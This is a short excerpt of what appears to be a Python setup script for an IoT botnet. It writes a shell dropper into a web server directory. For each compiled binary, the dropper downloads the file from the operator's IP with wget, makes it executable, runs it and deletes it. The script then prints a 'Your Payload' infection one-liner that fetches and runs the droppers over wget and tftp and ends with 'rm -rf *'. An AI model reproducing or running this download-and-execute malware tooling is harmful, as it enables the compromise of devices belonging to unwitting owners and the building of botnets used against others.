...
run('echo -e "#!/bin/bash" > /var/www/html/'+prefix+'k.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/'+prefix+'k.sh')
...
print("\x1b[33mYour Payload\x1b[1;36m:cd /tmp || cd /run || cd /; wget http://" + ip + "/"+prefix+"k.sh; chmod 777 "+prefix+"k.sh; sh "+prefix+"k.sh; tftp " + ip + " -c get "+prefix+"tftp1.sh; chmod 777 "+prefix+"tftp1.sh; sh "+prefix+"tftp1.sh; tftp -r "+prefix+"tftp2.sh -g " + ip + "; chmod 777 "+prefix+"tftp2.sh; sh "+prefix+"tftp2.sh; rm -rf "+prefix+"k.sh "+prefix+"tftp1.sh "+prefix+"tftp2.sh; rm -rf *\x1b[0m")
print
exit(1)
